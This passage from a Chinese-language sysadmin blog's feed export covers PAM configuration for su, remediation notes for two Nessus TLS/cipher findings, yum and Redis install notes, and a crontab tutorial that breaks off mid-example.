class="hljs-keyword">l</span><br></code></pre></td></tr></table></figure><p>配置文件中的每一行都是独立的认证过程，PAM模块自上到下的顺序调用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@iZbp1191gh7vw52537lyxrZ pam.d]# cat /etc/pam.d/su<br>#%PAM<span class="hljs-number">-1</span>twarden<span class="hljs-number">.0</span><br>authsufficientpam_rootok.so<br># Uncomment the <span class="hljs-keyword">following</span> <span class="hljs-type">line</span> <span class="hljs-keyword">to</span> implicitly trust users <span class="hljs-keyword">in</span> the &quot;wheel&quot; <span class="hljs-keyword">group</span>.<br><span class="hljs-meta">#authsufficientpam_wheel.so trust use_uid</span><br># Uncomment the <span class="hljs-keyword">following</span> <span class="hljs-type">line</span> <span class="hljs-keyword">to</span> require a <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> be <span class="hljs-keyword">in</span> the &quot;wheel&quot; <span class="hljs-keyword">group</span>.<br><span class="hljs-meta">#authrequiredpam_wheel.so use_uid</span><br>authsubstack<span class="hljs-keyword">system</span>-auth<br>auth<span class="hljs-keyword">include</span>postlogin<br>accountsufficientpam_succeed_if.so uid = <span class="hljs-number">0</span> use_uid quiet<br>account<span class="hljs-keyword">include</span><span class="hljs-keyword">system</span>-auth<br><span class="hljs-keyword">password</span><span class="hljs-keyword">include</span><span class="hljs-keyword">system</span>-auth<br><span class="hljs-keyword">session</span><span class="hljs-keyword">include</span><span class="hljs-keyword">system</span>-auth<br><span class="hljs-keyword">session</span><span class="hljs-keyword">include</span>postlogin<br><span class="hljs-keyword">session</span>optionalpam_xauth.so<br></code></pre></td></tr></table></figure><p>第一列 - PAM认证模块类型</p><p>auth-对用户身份进行识别，例如提示输入密码，是否为root等</p><p>account-对账号各项属性进行检测，例如是否允许登录系统，账号是否过期等</p><p>password-使用用户信息来更新数据，例如修改密码</p><p>session-设置用户登录前以及退出后需要进行的会话操作管理，例如登录连接信息</p><p>第二列 - PAM控制标记</p><p>sufficient-该认证过程成功后表示该模块成功，将不再进行后续的认证。该认证过程失败，不影响后续认证</p><p>required-该认证过程必须成功后才表示该模块成功，如果该认证过程失败后，后续认证会继续进行，等到后续认证完成后返回失败</p><p>requisite-与required相似，只有该认证过程成功后才表示该模块成功，如果该认证过程失败，则会立刻返回该模块失败，控制权返回给应用程序</p><p>substack-表示</p><p>include-表示在验证过程中需要加载调用其他配置文件，例如很多应用都会调用&#x2F;etc&#x2F;pam.d&#x2F;system-auth（主要用于用户登录系统认证）</p><p>optional-不进行认证是否成功的验证，只显示信息，常用于session</p><p>第三列 - PAM模块</p><p>默认在&#x2F;lib64&#x2F;security或&#x2F;lib&#x2F;security目录，如果没有在这两个目录，需要写绝对路径</p><p>模块可以出现在多个配置文件中，也就是多个PAM认证中</p><p>第四列 - PAM模块参数</p><p>根据不同的模块设置，可以有多个参数，多个参数使用空格分隔</p><h2 id="认证文件"><a href="#认证文件" class="headerlink" title="认证文件"></a>认证文件</h2><p>目录：&#x2F;lib64&#x2F;security</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ security]# <span class="hljs-keyword">ls</span><br>pam_access.<span class="hljs-keyword">so</span>     pam_filter        pam_mkhomedir.<span class="hljs-keyword">so</span>       pam_selinux.<span class="hljs-keyword">so</span>     pam_unix_auth.<span class="hljs-keyword">so</span><br>pam_cap.<span class="hljs-keyword">so</span>        pam_filter.<span class="hljs-keyword">so</span>     pam_motd.<span class="hljs-keyword">so</span>            pam_sepermit.<span class="hljs-keyword">so</span>    pam_unix_passwd.<span class="hljs-keyword">so</span><br>pam_chroot.<span class="hljs-keyword">so</span>     pam_ftp.<span class="hljs-keyword">so</span>        pam_namespace.<span class="hljs-keyword">so</span>       pam_shells.<span class="hljs-keyword">so</span>      pam_unix_session.<span class="hljs-keyword">so</span><br>pam_console.<span class="hljs-keyword">so</span>    pam_group.<span class="hljs-keyword">so</span>      pam_nologin.<span class="hljs-keyword">so</span>         pam_stress.<span class="hljs-keyword">so</span>      pam_unix.<span class="hljs-keyword">so</span><br>pam_cracklib.<span class="hljs-keyword">so</span>   pam_issue.<span class="hljs-keyword">so</span>      pam_permit.<span class="hljs-keyword">so</span>          pam_succeed_if.<span class="hljs-keyword">so</span>  pam_userdb.<span class="hljs-keyword">so</span><br>pam_debug.<span class="hljs-keyword">so</span>      pam_keyinit.<span class="hljs-keyword">so</span>    pam_postgresok.<span class="hljs-keyword">so</span>      pam_systemd.<span class="hljs-keyword">so</span>     pam_warn.<span class="hljs-keyword">so</span><br>pam_deny.<span class="hljs-keyword">so</span>       pam_lastlog.<span class="hljs-keyword">so</span>    pam_pwhistory.<span class="hljs-keyword">so</span>       pam_tally2.<span class="hljs-keyword">so</span>      pam_wheel.<span class="hljs-keyword">so</span><br>pam_echo.<span class="hljs-keyword">so</span>       pam_limits.<span class="hljs-keyword">so</span>     pam_pwquality.<span class="hljs-keyword">so</span>       pam_time.<span class="hljs-keyword">so</span>        pam_xauth.<span class="hljs-keyword">so</span><br>pam_env.<span class="hljs-keyword">so</span>        pam_listfile.<span class="hljs-keyword">so</span>   pam_rhosts.<span class="hljs-keyword">so</span>          pam_timestamp.<span class="hljs-keyword">so</span><br>pam_exec.<span class="hljs-keyword">so</span>       pam_localuser.<span class="hljs-keyword">so</span>  pam_rootok.<span class="hljs-keyword">so</span>          pam_tty_audit.<span class="hljs-keyword">so</span><br>pam_faildelay.<span class="hljs-keyword">so</span>  pam_loginuid.<span class="hljs-keyword">so</span>   pam_securetty.<span class="hljs-keyword">so</span>       pam_umask.<span class="hljs-keyword">so</span><br>pam_faillock.<span class="hljs-keyword">so</span>   pam_mail.<span class="hljs-keyword">so</span>       pam_selinux_permit.<span class="hljs-keyword">so</span>  pam_unix_acct.<span class="hljs-keyword">so</span><br></code></pre></td></tr></table></figure><p>也就是说用户访问服务器的某个服务，对应的服务器程序将用户请求发送到PAM模块进行认证，先判断具体的服务，再加载相应的PAM配置文件，最后通过认证文件进行认证</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]  系统安全及应用(su命令切换用户、PAM认证、sudo授权等) waldosia 2021-11-29 19:03:43</p><p><a href="https://blog.51cto.com/u_15386194/4715298">https://blog.51cto.com/u_15386194/4715298</a></p><p>[2] Linux配置允许普通用户免密码切换其他普通用户 chyuhung 2021-07-29 15:23</p><p><a href="https://www.cnblogs.com/chyuhung/p/15075280.html">https://www.cnblogs.com/chyuhung/p/15075280.html</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>system_security_hardening</title>
    <link href="/2024/05/07/security/osSec/system_security_hardening/"/>
    <url>/2024/05/07/security/osSec/system_security_hardening/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nessus-中危-TLS Version 1.0 Protocol Detection</title>
    <link href="/2024/05/07/security/osSec/nessus-%E4%B8%AD%E5%8D%B1-TLS%20Version%201.0%20Protocol%20Detection/"/>
    <url>/2024/05/07/security/osSec/nessus-%E4%B8%AD%E5%8D%B1-TLS%20Version%201.0%20Protocol%20Detection/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞标题"><a href="#漏洞标题" class="headerlink" title="漏洞标题"></a>漏洞标题</h2><p>TLS Version 1.0 Protocol Detection</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>The  remote service accepts connections encrypted using TLS 1.0. TLS 1.0 has  a     number of cryptographic design flaws. Modern implementations of TLS  1.0     mitigate these problems, but newer versions of TLS like 1.2 and 1.3  are     designed against these flaws and should be used whenever possible.          As of March 31, 2020, Endpoints that aren鈥檛 enabled for TLS 1.2     and higher will no longer function properly with major web browsers and  major vendors.          PCI DSS v3.2 requires that TLS 1.0 be disabled entirely by June 30,     2018, except for POS POI terminals (and the SSL&#x2F;TLS termination     points to which they connect) that can be verified as not being     susceptible to any known exploits.</p><p>The remote service encrypts traffic using an older version of TLS.</p><p>远程服务使用旧版本的TLS对流量进行加密。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>Enable support for  TLS 1.2 and 1.3, and disable support for TLS 1.0..</p><p>启用对TLS 1.2和1.3的支持，并禁用对TLS 1.0的支持</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nessus-中危-SSL Medium Strength Cipher Suites Supported</title>
    <link href="/2024/05/07/security/osSec/nessus-%E4%B8%AD%E5%8D%B1-SSL%20Medium%20Strength%20Cipher%20Suites%20Supported/"/>
    <url>/2024/05/07/security/osSec/nessus-%E4%B8%AD%E5%8D%B1-SSL%20Medium%20Strength%20Cipher%20Suites%20Supported/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞标题"><a href="#漏洞标题" class="headerlink" title="漏洞标题"></a>漏洞标题</h2><p>SSL Medium Strength Cipher Suites Supported (SWEET32)</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>The remote host supports the use of SSL ciphers that offer medium strength encryption. Nessus regards medium strength as any encryption that uses key lengths at least 64 bits and less than 112 bits, or else that uses the 3DES encryption suite.</p><p>Note that it is considerably easier to circumvent medium strength encryption if the attacker is on the same physical network.</p><p>远程主机支持使用提供中等强度加密的SSL密码。Nessus将中等强度视为密钥长度至少64位且小于112位的任何加密，或者使用3DES加密套件。</p><p>请注意，如果攻击者在同一个物理网络上，那么绕过中等强度加密就容易得多。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>Reconfigure the affected application if possible to avoid use of medium strength ciphers.</p><p>如果可能，请重新配置受影响的应用程序，以避免使用中等强度的密码。</p><p>删除所有CBC密码套件</p><p><a href="https://blog.csdn.net/Yang_RR/article/details/138616193">https://blog.csdn.net/Yang_RR/article/details/138616193</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yum</title>
    <link href="/2024/04/17/yunwei/yunweicommands/Linuxcommands/yum/"/>
    <url>/2024/04/17/yunwei/yunweicommands/Linuxcommands/yum/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="查看yum安装的服务"><a href="#查看yum安装的服务" class="headerlink" title="查看yum安装的服务"></a>查看yum安装的服务</h3><p>yum list installed </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@localhost</span> tmp]# yum list installed <br>已加载插件：fastestmirror<br>Loading mirror speeds from cached hostfile<br> * epel: mirrors.bfsu.edu.cn<br>已安装的软件包<br>NetworkManager.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>                                  <span class="hljs-number">1</span>:<span class="hljs-number">1.0</span>.<span class="hljs-number">6</span><span class="hljs-number">-27</span>.el<span class="hljs-number">7</span>           <span class="hljs-title">@anaconda</span><br>cpp.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>                                             <span class="hljs-number">4.8</span>.<span class="hljs-number">5</span><span class="hljs-number">-44</span>.el<span class="hljs-number">7</span>             <span class="hljs-title">@base</span>    <br>epel-<span class="hljs-keyword">release</span>.noarch                                    <span class="hljs-number">7</span><span class="hljs-number">-11</span>                     <span class="hljs-title">@extras</span>  <br>glibc.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>                                           <span class="hljs-number">2.17</span><span class="hljs-number">-324</span>.el<span class="hljs-number">7</span>_<span class="hljs-number">9</span>           <span class="hljs-title">@updates</span> <br>redis.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>                                           <span class="hljs-number">3.2</span>.<span class="hljs-number">12</span><span class="hljs-number">-2</span>.el<span class="hljs-number">7</span>             <span class="hljs-title">@epel</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>yum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis_base</title>
    <link href="/2024/04/16/db/redis/redis_base/"/>
    <url>/2024/04/16/db/redis/redis_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h3><h4 id="添加-EPEL-存储库"><a href="#添加-EPEL-存储库" class="headerlink" title="添加 EPEL 存储库"></a>添加 EPEL 存储库</h4><p>sudo yum install epel-release</p><h4 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h4><p>sudo yum install redis</p><p>默认安装的版本为 3.2.12</p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2>]]></content>
    
    
    <categories>
      
      <category>db</category>
      
      <category>redis</category>
      
    </categories>
    
    
    <tags>
      
      <tag>db</tag>
      
      <tag>redis</tag>
      
      <tag>base</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>crontab</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/crontab/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/crontab/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>crontab(定时任务)，是系统为用户提供定时执行任务的功能。</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>不同版本的系统，都会在通用语法的之后再扩展一些语法</p><h3 id="crontab命令语法："><a href="#crontab命令语法：" class="headerlink" title="crontab命令语法："></a>crontab命令语法：</h3><p><strong>crontab [-u user] [-l | -r | -e] [-i] [-s]</strong></p><p><strong>-u user</strong>：指定用户，不指定表示当前用户，只有管理员才可以指定用户，普通用户使用-u会出现如下提示</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[test<span class="hljs-variable">@110</span> /]<span class="hljs-variable">$ </span>crontab -u apache -l<br>must be privileged to <span class="hljs-keyword">use</span> -u<br></code></pre></td></tr></table></figure><p><strong>-l</strong>：list的意思，查看定时任务列表</p><p><strong>-e</strong>：edit的意思，编辑指定定时任务，退出编辑状态之后会自动重新加载（reload）定时任务</p><p><strong>-r</strong>：remove的意思，删除定时任务，如果有权限就会直接删除</p><p><strong>-i</strong>：和-r搭配使用，会出现提示是否删除，输入y&#x2F;Y就会删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@110 root]$ crontab -r -i<br>crontab: really delete <span class="hljs-built_in">test</span><span class="hljs-string">&#x27;s crontab?</span><br></code></pre></td></tr></table></figure><p>centos7扩展语法，增加了对集群的支持，-c&#x2F;-n host</p><p>centos8扩展语法，增加了对集群的支持，-c&#x2F;-n host</p><p><strong>-V</strong>：显示版本</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@localhost</span> /]# cat /etc/redhat-<span class="hljs-keyword">release</span> <br>Red Hat Enterprise Linux <span class="hljs-keyword">release</span> <span class="hljs-number">8.3</span> (Ootpa)<br></code></pre></td></tr></table></figure><h2 id="crontab格式"><a href="#crontab格式" class="headerlink" title="crontab格式"></a>crontab格式</h2><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><p>* * * * * command(要运行的命令)</p><p># +—————- minute  分钟(0 - 59) </p><p># |  +————- hour    小时(0 - 23) </p><p># |  |  +———- day     日期(1 - 31) </p><p># |  |  |  +——- month   月份(1 - 12) </p><p># |  |  |  |  +—- week    星期(0 - 7) (星期天&#x3D;0 or 7) </p><p># |  |  |  |  | # *  *  *  *  *  要运行的命令**</p><h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><p>* 表示允许范围内任意数字</p><p>&#x2F; 表示每单元，*&#x2F;5:每5个单元</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">*<span class="hljs-string">/5</span> * * * * <span class="hljs-keyword">ls</span> <span class="hljs-comment">#每五分钟执行一次ls</span><br></code></pre></td></tr></table></figure><p>a-b 表示从a-b的数字</p><p>a,b,c 表示在a,b,c的时间点执行</p><p><strong>示例:</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">每天早上6点追加一条字符串到一个文本。<br>0 6 * * * <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Good morning.&quot;</span> &gt;&gt; <span class="hljs-string">/tmp/test.txt</span><br><br>每两个小时追加一条字符串一个文本。-<br>0 *<span class="hljs-string">/2</span> * * * <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;two hours append text.&quot;</span> &gt;&gt; <span class="hljs-string">/tmp/test.txt</span><br><br>晚上11点到早上8点之间每两个小时，早上八点<br>0 23-7/2，8 * * * <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sleep&quot;</span> &gt;&gt; <span class="hljs-string">/tmp/test.txt</span><br><br>每个月的4号和每个礼拜的礼拜一到礼拜三的早上11点<br>0 11 4 * 1-3 <span class="hljs-keyword">command</span> line<br><br>1月1日早上4点<br>0 4 1 1 * <span class="hljs-keyword">command</span> line<br><br>每月每天每小时的第 0 分钟执行一次 <span class="hljs-string">/bin/ls</span><br>0 * * * * <span class="hljs-string">/bin/ls</span><br><br>在 12 月内, 每天的早上 6 点到 12 点中，每隔 20 分钟执行一次 <span class="hljs-string">/usr/bin/backup</span><br>*<span class="hljs-string">/20</span> 6-12 * 12 * <span class="hljs-string">/usr/bin/backup</span><br><br>周一到周五每天下午 5<span class="hljs-function">:00</span> 寄一封信给 alex_mail_name :<br>0 17 * * 1-5 mail -s <span class="hljs-string">&quot;hi&quot;</span> alex_mail_name &lt; <span class="hljs-string">/tmp/maildata</span><br><br>每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分<span class="hljs-string">....</span>执行 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;haha&quot;</span><br>20 0-23/2 * * * <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;haha&quot;</span><br><br>晚上11点到早上8点之间每两个小时，早上8点,显示时间<br>0 23-7/2，8 * * * date<br></code></pre></td></tr></table></figure><h2 id="不同级别crontab"><a href="#不同级别crontab" class="headerlink" title="不同级别crontab"></a>不同级别crontab</h2><h4 id="用户crontab"><a href="#用户crontab" class="headerlink" title="用户crontab"></a>用户crontab</h4><p>&#x2F;var&#x2F;spool&#x2F;cron目录</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ cron]<span class="hljs-comment"># ls -lat /var/spool/cron</span><br>total 16<br>drwx------.<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Jun<span class="hljs-number"> 14 </span>11:35 .<br>-rw------- <span class="hljs-number"> 1 </span>test test  <span class="hljs-number"> 20 </span>Jun<span class="hljs-number"> 14 </span>11:35 test<br>-rw------- <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 20 </span>Jun <span class="hljs-number"> 6 </span>13:46 root<br>drwxr-xr-x.<span class="hljs-number"> 9 </span>root root<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 15 </span><span class="hljs-number"> 2017 </span>..<br></code></pre></td></tr></table></figure><p>目录权限：</p><p>​drwx——,也就是700，所属组为root:root,表示只有root有操作权限</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">drwx</span>------. <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">14</span> <span class="hljs-number">11</span>:<span class="hljs-number">25</span> cron/<br></code></pre></td></tr></table></figure><p>文件权限：</p><p>​-rw——-，也就是600，所属组为对应用户，表示只有对应对应用户有查看编辑权限（root,有所有权限）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-rw-------  1 <span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span>   20 Jun 14 11:35 <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><h4 id="主系统crontab"><a href="#主系统crontab" class="headerlink" title="主系统crontab"></a>主系统crontab</h4><p>&#x2F;etc&#x2F;crontab </p><p>文件权限为 -rw-r–r–，也就是644，表示任何用户都可以查看，但只有 root 可修改</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">[apache@110 cron]$ <span class="hljs-keyword">ls</span> -lat <span class="hljs-string">/etc/crontab</span><br>-rw-r<span class="hljs-params">--r--</span>. 1 root root 451 Jun 10  2014 <span class="hljs-string">/etc/crontab</span><br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ruby">[apache<span class="hljs-variable">@110</span> cron]<span class="hljs-variable">$ </span>cat /etc/crontab<br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/bash</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/sbin:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><span class="hljs-variable constant_">MAILTO</span>=root<br><br><span class="hljs-comment"># For details see man 4 crontabs</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name  command to be executed</span><br><br></code></pre></td></tr></table></figure><h4 id="周期性执行脚本目录"><a href="#周期性执行脚本目录" class="headerlink" title="周期性执行脚本目录"></a>周期性执行脚本目录</h4><p>&#x2F;etc&#x2F;cron.hourly:每小时执行</p><p>&#x2F;etc&#x2F;cron.daily:每天执行</p><p>&#x2F;etc&#x2F;cron.weekly:每周执行</p><p>&#x2F;etc&#x2F;cron.monthly:每月执行</p><p>目录权限均为drwxr-xr-x，也就是766</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">drwxr</span>-xr-x. <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">10</span>  <span class="hljs-number">2014</span> /etc/cron.weekly<br></code></pre></td></tr></table></figure><h2 id="定时任务调用流程"><a href="#定时任务调用流程" class="headerlink" title="定时任务调用流程"></a>定时任务调用流程</h2><h5 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h5><p>ll &#x2F;etc&#x2F;cron.d</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">[apache@110 cron.weekly]$ ll /etc/cron.d<br>total 8<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 128 </span>Aug <span class="hljs-number"> 9 </span><span class="hljs-number"> 2019 </span>0hourly<br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 235 </span>Apr <span class="hljs-number"> 1 </span><span class="hljs-number"> 2020 </span>sysstat<br></code></pre></td></tr></table></figure><p>cat &#x2F;etc&#x2F;cron.d&#x2F;0hourly</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby">[apache<span class="hljs-variable">@110</span> cron.weekly]<span class="hljs-variable">$ </span>cat /etc/cron.d/0hourly<br><span class="hljs-comment"># Run the hourly jobs</span><br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/bash</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/sbin:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><span class="hljs-variable constant_">MAILTO</span>=root<br><span class="hljs-number">01</span> * * * * root run-parts /etc/cron.hourly<br></code></pre></td></tr></table></figure><p>ll &#x2F;etc&#x2F;cron.hourly&#x2F;</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@110 cron]<span class="hljs-comment"># ll /etc/cron.hourly/</span><br>total 4<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 392 </span>Aug <span class="hljs-number"> 9 </span><span class="hljs-number"> 2019 </span>0anacron<br></code></pre></td></tr></table></figure><p>cat &#x2F;etc&#x2F;cron.hourly&#x2F;0anacron</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">(base) [root@<span class="hljs-number">110</span> cron]<span class="hljs-comment"># cat /etc/cron.hourly/0anacron</span><br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-comment"># Check whether 0anacron was run today already</span><br><span class="hljs-keyword">if</span> test -r <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/anacron/</span>cron.daily; then<br>    day=`cat <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/anacron/</span>cron.daily`<br>fi<br><span class="hljs-keyword">if</span> [ `date +%Y%m%d` = <span class="hljs-string">&quot;$day&quot;</span> ]; then<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span>;<br>fi<br><br><span class="hljs-comment"># Do not run jobs when on battery power</span><br><span 